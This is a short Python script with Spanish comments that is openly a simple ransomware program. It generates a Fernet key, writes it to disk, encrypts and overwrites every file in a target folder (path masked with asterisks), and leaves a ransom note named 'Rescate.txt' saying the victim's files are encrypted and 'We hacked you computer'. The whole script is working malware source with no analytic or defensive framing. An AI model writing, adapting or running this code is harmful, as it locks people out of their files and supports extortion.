from cryptography.fernet import Fernet
import os

# Generar la clave
def generar_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)
#Cargar la clave
def cargar_key():
    return open('key.key', 'rb').read()
#Funcion que Cifra los archivos
def encrypt(items, Key):
    f = Fernet(key)
    for item in items :
        with open(item, 'rb') as file:
            file_data  = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item, 'wb') as file:
            file.write(encrypted_data)

if __name__ == '__main__':
    # Ruta de archivos objetivos a Cifrar
    path_to_encrypt = '*:\\*****\\*************\\*******'
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt +'\\'+item for item in items]

    generar_key()
    key = cargar_key()
    encrypt(full_path, key)
    
    # Mensaje de Rescate
    with open(path_to_encrypt +'\\'+ 'Rescate.txt', 'w') as file:
        file.write('Todos tus archivos se encuentran Cifrado \n')
        file.write('We hacked you computer seccessfull')